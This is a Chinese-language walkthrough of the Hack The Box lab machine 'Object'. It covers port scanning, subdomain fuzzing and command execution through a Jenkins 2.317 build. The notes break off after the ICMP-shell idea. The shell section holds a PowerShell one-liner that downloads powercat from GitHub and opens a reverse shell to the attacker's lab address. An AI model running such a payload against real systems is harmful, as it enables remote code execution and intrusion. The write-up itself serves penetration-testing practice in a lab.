kali 10.10.14.5

靶机 10.10.11.132

[HTB: Object | 0xdf hacks stuff](https://0xdf.gitlab.io/2022/02/28/htb-object.html)

[htb OSCP like object靶机渗透测试（AD域渗透）_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1uR4y1N7pW/?spm_id_from=333.788&vd_source=f21386f67860beb8cb1ded310d802d3f)

# Recon

## nmap

```bash
└─# nmap -p- --min-rate 4444  10.10.11.132
└─# nmap -p 80,5985,8080 -sCV -oN namp.txt 10.10.11.132
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Mega Engines
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp open  http    Jetty 9.4.43.v20210629
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.43.v20210629)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

绑定 hosts

```bash
└─# echo '10.10.11.132 object.htb' >> /etc/hosts       
```



## 80 Website

<img src=".\图片\Snipaste_2023-09-22_09-03-06.png" alt="Snipaste_2023-09-22_09-03-06" style="zoom:67%;" />

目录爆破：

```bash
feroxbuster -u http://object.htb
```

无事发生

由于得到了域名 `object.htb`



## Virtual Host Fuzz

子域名爆破

```bash
└─#  wfuzz -u http://object.htb -H 'Host: FUZZ.object.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 29932
```

啥也没有



## 8080 Jenkins

访问 `http://object.htb:8080` 就跳到了登录页面

<img src=".\图片\Snipaste_2023-09-22_09-06-45.png" alt="Snipaste_2023-09-22_09-06-45" style="zoom:80%;" />

先搜索下 CMS 已知的漏洞：

```bash
└─# searchsploit Jenkins 
```

先放放，再创建一个账号登录进去看看，得到详细版本 `Jenkins 2.317`

[Jenkins (flowus.cn)](https://flowus.cn/bad75f5a-7a7e-4a3a-aadf-1e78746ca8ee)

<img src=".\图片\Snipaste_2023-09-22_09-27-02.png" alt="Snipaste_2023-09-22_09-27-02" style="zoom:80%;" />

显示未授权

# Shell as oliver

就是尝试可以 getshell 的点

<img src=".\图片\Snipaste_2023-09-22_09-53-33.png" alt="Snipaste_2023-09-22_09-53-33" style="zoom:80%;" />

发现可以命令执行

<img src=".\图片\Snipaste_2023-09-22_09-55-23.png" alt="Snipaste_2023-09-22_09-55-23" style="zoom:80%;" />

尝试 反弹 shell

```
powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 10.10.14.5 -p 4321 -e cmd
```

结果失败，显示报错，推测可能存在 waf

能绕则绕，绕不过就读取重要配置文件

## ICMP上线

build 成功

<img src=".\图片\Snipaste_2023-09-22_10-58-57.png" alt="Snipaste_2023-09-22_10-58-57" style="zoom:67%;" />

kali 接受到 icmp 请求

<img src=".\图片\Snipaste_2023-09-22_11-00-10.png" alt="Snipaste_2023-09-22_11-00-10" style="zoom:67%;" />

于是可以想到用 ICMP shell

用 nixhang 里的 icmp powershell



不行就读取配置文件，得到账号密码


